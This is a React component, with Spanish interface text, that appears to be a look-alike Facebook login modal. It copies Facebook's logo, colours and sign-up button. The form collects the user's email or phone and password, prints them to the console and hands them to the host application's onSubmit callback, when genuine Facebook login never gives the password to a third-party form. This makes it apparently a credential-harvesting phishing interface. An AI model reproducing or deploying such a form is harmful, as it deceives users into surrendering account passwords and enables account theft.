import React from 'react';
import { Modal, Form, Input, Button, Typography, Divider } from 'antd';
import { FacebookOutlined } from '@ant-design/icons';

const { Text, Link } = Typography;

const FacebookLoginModal = ({ visible, onClose, onSubmit }) => {
  const [form] = Form.useForm();

  const handleSubmit = () => {
    form.validateFields().then(values => {
      console.log('Intento de inicio de sesión con:', values);
      onSubmit(values);
      form.resetFields();
    });
  };

  return (
    <Modal
      title={
        <div style={{ textAlign: 'center', padding: '10px 0' }}>
          <FacebookOutlined style={{ fontSize: '32px', color: '#1877f2' }} />
          <div style={{ marginTop: '8px', fontSize: '18px', fontWeight: 'bold' }}>
            Iniciar sesión en Facebook
          </div>
        </div>
      }
      open={visible}
      onCancel={onClose}
      footer={null}
      width={400}
      style={{ top: '50px' }}
    >
      <div style={{ padding: '20px 0' }}>
        <Form form={form} layout="vertical">
          <Form.Item
            name="email"
            rules={[{ required: true, message: 'El correo electrónico o el número de móvil son obligatorios' }]}
          >
            <Input 
              placeholder="Correo electrónico o número de móvil" 
              size="large"
            />
          </Form.Item>
          
          <Form.Item
            name="password"
            rules={[{ required: true, message: 'La contraseña es obligatoria' }]}
          >
            <Input.Password 
              placeholder="Contraseña" 
              size="large"
            />
          </Form.Item>

          <Form.Item>
            <Button 
              type="primary" 
              block 
              size="large"
              onClick={handleSubmit}
              style={{ 
                height: '48px',
                fontSize: '16px',
                fontWeight: 'bold'
              }}
            >
              Iniciar sesión
            </Button>
          </Form.Item>

          <div style={{ textAlign: 'center' }}>
            <Link href="#" style={{ color: '#1877f2' }}>
              ¿Has olvidado la contraseña?
            </Link>
          </div>

          <Divider style={{ margin: '24px 0' }} />

          <div style={{ textAlign: 'center' }}>
            <Button 
              size="large"
              style={{ 
                backgroundColor: '#42b72a',
                borderColor: '#42b72a',
                color: 'white',
                height: '48px',
                fontWeight: 'bold',
                fontSize: '16px'
              }}
              onClick={() => window.open('https://www.facebook.com/signup', '_blank')}
            >
              Crear cuenta nueva
            </Button>
          </div>
        </Form>
      </div>
    </Modal>
  );
};

export default FacebookLoginModal;
